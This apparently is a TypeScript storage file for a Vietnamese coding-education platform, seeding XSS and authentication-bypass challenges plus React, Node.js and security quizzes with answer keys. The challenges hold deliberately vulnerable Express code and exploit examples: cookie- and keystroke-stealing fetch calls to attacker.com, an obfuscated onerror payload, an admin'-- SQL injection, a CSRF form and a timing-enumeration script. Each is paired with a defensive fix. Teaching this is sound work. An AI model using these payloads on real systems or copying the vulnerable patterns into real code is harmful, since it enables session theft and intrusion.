    // Add Security Challenges
    await this.createSecurityChallenge({
      title: "Cross-Site Scripting (XSS) Exploitation",
      description: "Tìm và exploit lỗ hổng XSS trong ứng dụng web để steal cookies",
      category: "xss",
      difficulty: "medium",
      vulnerableCode: `// Vulnerable search functionality
app.get('/search', (req, res) => {
    const query = req.query.q;
    res.send(\`
        <h1>Search Results</h1>
        <p>You searched for: \${query}</p>
        <div id="results">
            <!-- Search results here -->
        </div>
    \`);
});

// Vulnerable comment system
app.post('/comment', (req, res) => {
    const comment = req.body.comment;
    comments.push({
        text: comment,
        timestamp: new Date()
    });
    res.redirect('/comments');
});

app.get('/comments', (req, res) => {
    let html = '<h1>Comments</h1>';
    comments.forEach(comment => {
        html += \`<div class="comment">
            <p>\${comment.text}</p>
            <small>\${comment.timestamp}</small>
        </div>\`;
    });
    res.send(html);
});`,
      exploitExample: `// Reflected XSS payload
http://vulnerable-site.com/search?q=<script>alert('XSS')</script>

// Stored XSS payload
<script>
    // Steal cookies
    fetch('http://attacker.com/steal?cookie=' + document.cookie);
    
    // Keylogger
    document.addEventListener('keydown', function(e) {
        fetch('http://attacker.com/keys?key=' + e.key);
    });
    
    // Session hijacking
    if(document.cookie.includes('sessionid')) {
        fetch('http://attacker.com/session?sid=' + document.cookie);
    }
</script>

// Advanced payload (bypassing filters)
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))">
<svg onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">

// DOM-based XSS
<script>
    var hash = location.hash.substring(1);
    document.getElementById('output').innerHTML = hash;
</script>
URL: http://site.com#<img src=x onerror=alert('XSS')>`,
      solution: `// Input sanitization
const DOMPurify = require('dompurify');
const { JSDOM } = require('jsdom');

const window = new JSDOM('').window;
const purify = DOMPurify(window);

app.get('/search', (req, res) => {
    const query = purify.sanitize(req.query.q);
    res.send(\`
        <h1>Search Results</h1>
        <p>You searched for: \${query}</p>
    \`);
});

// Content Security Policy
app.use((req, res, next) => {
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
    );
    next();
});

// Output encoding
function escapeHtml(text) {
    const map = {
        '&': '&amp;',
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&#039;'
    };
    return text.replace(/[&<>"']/g, m => map[m]);
}`,
      hints: [
        "Kiểm tra các input fields không được validate",
        "Thử các payload XSS cơ bản trước",
        "Chú ý các attribute events (onload, onerror)",
        "Sử dụng developer tools để debug"
      ]
    });

    await this.createSecurityChallenge({
      title: "Authentication Bypass & Session Hijacking",
      description: "Khai thác lỗ hổng authentication để truy cập unauthorized accounts",
      category: "authentication",
      difficulty: "hard",
      vulnerableCode: `// Insecure session management
const sessions = {};

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    
    // Weak password check
    if (users[username] && users[username].password === password) {
        // Predictable session ID
        const sessionId = username + '_' + Date.now();
        sessions[sessionId] = { username, timestamp: Date.now() };
        
        res.cookie('session', sessionId, { 
            httpOnly: false,  // Accessible via JavaScript
            secure: false,    // Sent over HTTP
            sameSite: 'none'  // No CSRF protection
        });
        res.redirect('/dashboard');
    } else {
        res.send('Invalid credentials');
    }
});

// No session validation
app.get('/dashboard', (req, res) => {
    const sessionId = req.cookies.session;
    if (sessions[sessionId]) {
        res.send(\`Welcome \${sessions[sessionId].username}\`);
    } else {
        res.redirect('/login');
    }
});

// SQL injection in login
app.post('/login-sql', (req, res) => {
    const { username, password } = req.body;
    const query = \`SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'\`;
    
    db.query(query, (err, result) => {
        if (result.length > 0) {
            res.send('Login successful');
        }
    });
});`,
      exploitExample: `// 1. Session prediction attack
// Sessions follow pattern: username_timestamp
// Brute force recent timestamps for known usernames

// 2. SQL injection bypass
username: admin'--
password: anything
// Query becomes: SELECT * FROM users WHERE username = 'admin'-- AND password = 'anything'

// 3. Session hijacking via XSS
<script>
    fetch('http://attacker.com/steal', {
        method: 'POST',
        body: 'session=' + document.cookie
    });
</script>

// 4. CSRF attack
<form action="http://vulnerable-site.com/transfer" method="POST">
    <input type="hidden" name="amount" value="1000">
    <input type="hidden" name="to" value="attacker_account">
    <input type="submit" value="Click here for free money!">
</form>

// 5. Timing attack on login
import time
import requests

usernames = ['admin', 'user', 'test']
for username in usernames:
    start = time.time()
    response = requests.post('/login', {
        'username': username,
        'password': 'wrong'
    })
    end = time.time()
    
    if end - start > 0.5:  # Longer response = valid username
        print(f"Found valid username: {username}")`,
      solution: `// Secure authentication implementation
const bcrypt = require('bcrypt');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');

// Rate limiting
const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // Limit each IP to 5 requests per windowMs
    message: 'Too many login attempts'
});

app.post('/login', loginLimiter, async (req, res) => {
    const { username, password } = req.body;
    
    // Input validation
    if (!username || !password) {
        return res.status(400).send('Missing credentials');
    }
    
    // Secure database query (prepared statement)
    const query = 'SELECT * FROM users WHERE username = ?';
    const [users] = await db.execute(query, [username]);
    
    if (users.length === 0) {
        // Constant time delay to prevent timing attacks
        await bcrypt.compare(password, '$2b$10$dummy.hash.to.prevent.timing');
        return res.status(401).send('Invalid credentials');
    }
    
    const user = users[0];
    const isValid = await bcrypt.compare(password, user.password);
    
    if (!isValid) {
        return res.status(401).send('Invalid credentials');
    }
    
    // Generate secure session ID
    const sessionId = crypto.randomBytes(32).toString('hex');
    
    // Store session securely
    sessions[sessionId] = {
        userId: user.id,
        username: user.username,
        timestamp: Date.now(),
        ip: req.ip
    };
    
    // Secure cookie settings
    res.cookie('session', sessionId, {
        httpOnly: true,     // Prevent XSS
        secure: true,       // HTTPS only
        sameSite: 'strict', // CSRF protection
        maxAge: 24 * 60 * 60 * 1000 // 24 hours
    });
    
    res.redirect('/dashboard');
});

// Session validation middleware
function requireAuth(req, res, next) {
    const sessionId = req.cookies.session;
    const session = sessions[sessionId];
    
    if (!session) {
        return res.redirect('/login');
    }
    
    // Check session expiry
    if (Date.now() - session.timestamp > 24 * 60 * 60 * 1000) {
        delete sessions[sessionId];
        return res.redirect('/login');
    }
    
    // Check IP consistency (optional)
    if (session.ip !== req.ip) {
        delete sessions[sessionId];
        return res.redirect('/login');
    }
    
    req.user = session;
    next();
}`,
      hints: [
        "Thử SQL injection với comment syntax",
        "Kiểm tra session cookies trong developer tools",
        "Tìm pattern trong session IDs",
        "Sử dụng Burp Suite để intercept requests"
      ]
    });
  }

  // Quiz methods implementation
  async getQuizzesByCourseId(courseId: number): Promise<Quiz[]> {
    return Array.from(this.quizzesData.values()).filter(quiz => quiz.courseId === courseId);
  }

  async getQuizById(id: number): Promise<Quiz | undefined> {
    return this.quizzesData.get(id);
  }

  async createQuiz(insertQuiz: InsertQuiz): Promise<Quiz> {
    const id = this.currentQuizId++;
    const quiz: Quiz = {
      ...insertQuiz,
      id,
      createdAt: new Date(),
    };
    this.quizzesData.set(id, quiz);
    return quiz;
  }

  async getQuizAttempts(userId: number, quizId?: number): Promise<QuizAttempt[]> {
    return Array.from(this.quizAttemptsData.values()).filter(attempt => 
      attempt.userId === userId && (!quizId || attempt.quizId === quizId)
    );
  }

  async createQuizAttempt(insertAttempt: InsertQuizAttempt): Promise<QuizAttempt> {
    const id = this.currentQuizAttemptId++;
    const attempt: QuizAttempt = {
      ...insertAttempt,
      id,
      createdAt: new Date(),
    };
    this.quizAttemptsData.set(id, attempt);
    return attempt;
  }

  async updateQuizAttempt(id: number, updates: Partial<InsertQuizAttempt>): Promise<QuizAttempt | undefined> {
    const attempt = this.quizAttemptsData.get(id);
    if (!attempt) return undefined;

    const updated: QuizAttempt = { ...attempt, ...updates };
    this.quizAttemptsData.set(id, updated);
    return updated;
  }

  private async addQuizData() {
    // React Fundamentals Quiz
    await this.createQuiz({
      courseId: 1,
      title: "React Fundamentals Quiz",
      description: "Test your knowledge of React basics",
      questions: JSON.stringify([
        {
          id: 1,
          question: "React component nào được sử dụng để quản lý state trong functional component?",
          options: ["useState", "useEffect", "useContext", "useReducer"],
          correctAnswer: 0,
          explanation: "useState hook được sử dụng để thêm state vào functional components",
          difficulty: "easy",
          category: "React Hooks"
        },
        {
          id: 2,
          question: "JSX là gì trong React?",
          options: ["JavaScript Extension", "Java Syntax Extension", "JavaScript XML", "JSON XML"],
          correctAnswer: 2,
          explanation: "JSX (JavaScript XML) cho phép viết HTML-like syntax trong JavaScript",
          difficulty: "easy",
          category: "React Fundamentals"
        },
        {
          id: 3,
          question: "Hook nào được sử dụng để thực hiện side effects trong React?",
          options: ["useState", "useEffect", "useMemo", "useCallback"],
          correctAnswer: 1,
          explanation: "useEffect hook được sử dụng để handle side effects như API calls, subscriptions",
          difficulty: "medium",
          category: "React Hooks"
        },
        {
          id: 4,
          question: "Cách nào đúng để pass props xuống child component?",
          options: [
            "<Child prop={value} />",
            "<Child {prop: value} />", 
            "<Child prop=value />",
            "<Child (prop)={value} />"
          ],
          correctAnswer: 0,
          explanation: "Props được pass bằng cách sử dụng attribute syntax: prop={value}",
          difficulty: "easy",
          category: "React Props"
        },
        {
          id: 5,
          question: "React key prop được sử dụng để làm gì?",
          options: [
            "Tăng hiệu suất rendering",
            "Định danh unique cho elements trong list",
            "Cả hai đáp án trên",
            "Không có tác dụng gì"
          ],
          correctAnswer: 2,
          explanation: "Key giúp React identify các elements trong list để optimize re-rendering",
          difficulty: "medium",
          category: "React Optimization"
        }
      ]),
      timeLimit: 600, // 10 minutes
      passingScore: 70
    });

    // Node.js Quiz
    await this.createQuiz({
      courseId: 2,
      title: "Node.js Backend Development Quiz",
      description: "Test your Node.js and Express knowledge",
      questions: JSON.stringify([
        {
          id: 1,
          question: "Node.js được xây dựng trên JavaScript engine nào?",
          options: ["SpiderMonkey", "V8", "Chakra", "JavaScriptCore"],
          correctAnswer: 1,
          explanation: "Node.js được xây dựng trên V8 JavaScript engine của Google Chrome",
          difficulty: "easy",
          category: "Node.js Fundamentals"
        },
        {
          id: 2,
          question: "Middleware trong Express.js hoạt động như thế nào?",
          options: [
            "Chạy trước mọi route handler",
            "Chạy theo thứ tự được định nghĩa",
            "Có thể modify request và response objects",
            "Tất cả đáp án trên"
          ],
          correctAnswer: 3,
          explanation: "Express middleware chạy theo thứ tự, có thể modify req/res objects",
          difficulty: "medium",
          category: "Express.js"
        },
        {
          id: 3,
          question: "npm là viết tắt của gì?",
          options: ["Node Package Manager", "New Package Manager", "Node Program Manager", "Network Package Manager"],
          correctAnswer: 0,
          explanation: "npm stands for Node Package Manager",
          difficulty: "easy",
          category: "Node.js Tools"
        }
      ]),
      timeLimit: 450, // 7.5 minutes
      passingScore: 75
    });

    // Security Quiz
    await this.createQuiz({
      courseId: 3,
      title: "Web Security Fundamentals Quiz",
      description: "Test your understanding of web security concepts",
      questions: JSON.stringify([
        {
          id: 1,
          question: "XSS (Cross-Site Scripting) attack có thể được prevent bằng cách nào?",
          options: [
            "Input validation và output encoding",
            "Sử dụng HTTPS",
            "Strong password policy",
            "Regular backup"
          ],
          correctAnswer: 0,
          explanation: "XSS prevention chủ yếu dựa vào input validation và output encoding",
          difficulty: "medium",
          category: "Web Security"
        },
        {
          id: 2,
          question: "SQL Injection attack target vào đâu?",
          options: ["Client-side code", "Database queries", "Network protocols", "File system"],
          correctAnswer: 1,
          explanation: "SQL Injection tấn công vào database queries thông qua malicious input",
          difficulty: "medium",
          category: "Database Security"
        },
        {
          id: 3,
          question: "CSRF token được sử dụng để protect khỏi attack nào?",
          options: ["XSS", "SQL Injection", "Cross-Site Request Forgery", "Man-in-the-middle"],
          correctAnswer: 2,
          explanation: "CSRF token protect khỏi Cross-Site Request Forgery attacks",
          difficulty: "hard",
          category: "Web Security"
        }
      ]),
      timeLimit: 600,
      passingScore: 80
    });
  }
}

// Using MemStorage for comprehensive testing
export const storage = new MemStorage();
